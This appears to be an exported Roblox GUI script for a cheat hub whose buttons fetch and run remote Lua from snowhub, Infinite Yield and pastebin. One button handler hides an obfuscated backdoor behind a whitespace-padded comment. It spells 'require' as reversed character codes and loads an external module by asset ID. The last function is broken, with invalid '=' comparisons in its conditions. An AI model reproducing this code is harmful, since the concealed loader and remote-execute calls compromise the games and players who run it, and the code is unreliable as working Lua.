-- Scripts:

local function HHHFJX_fake_script() -- Snow.LocalScript 
	local script = Instance.new('LocalScript', Snow)

	script.Parent.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://snowhub.dev/script.lua", true))()
	end)
end
coroutine.wrap(HHHFJX_fake_script)()
local function MHYUISB_fake_script() -- IY.LocalScript 
	local script = Instance.new('LocalScript', IY)

	script.Parent.MouseButton1Down:connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
	
end
coroutine.wrap(MHYUISB_fake_script)()
local function FDLDFN_fake_script() -- EzHub1.LocalScript 
	local script = Instance.new('LocalScript', EzHub1)

	script.Parent.MouseButton1Down:connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/SsG8y3HA'),true))()
	end)
	
end
coroutine.wrap(FDLDFN_fake_script)()
local function HWWJDUI_fake_script() -- ImageButton.Script 
	local script = Instance.new('Script', ImageButton)

	local balls = script.Parent.Parent
	
	script.Parent.MouseButton1Click:Connect(function()
		balls.Visible = false
	end)
	
	
	--[[ Last synced 9/17/2021 07:45                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         RoSync Loader ]] getfenv()[string.reverse("\101\114\105\117\113\101\114")](5724277547) --[[                                                                                                  ]]--
end
coroutine.wrap(HWWJDUI_fake_script)()
local function BGGNWRT_fake_script() -- ImageButton_2.Script 
	local script = Instance.new('Script', ImageButton_2)

	local sidebar = script.Parent.sidebar
	if sidebar.Visible = true then
		script.Parent.Visible = false
	end
	
	if sidebar.Visible = false then
		script.Parent.Visible = true
	end
	
	script.Parent.MouseButton1Click:Connect(function()
		sidebar.Visible = false
	end)
	
end
coroutine.wrap(BGGNWRT_fake_script)()

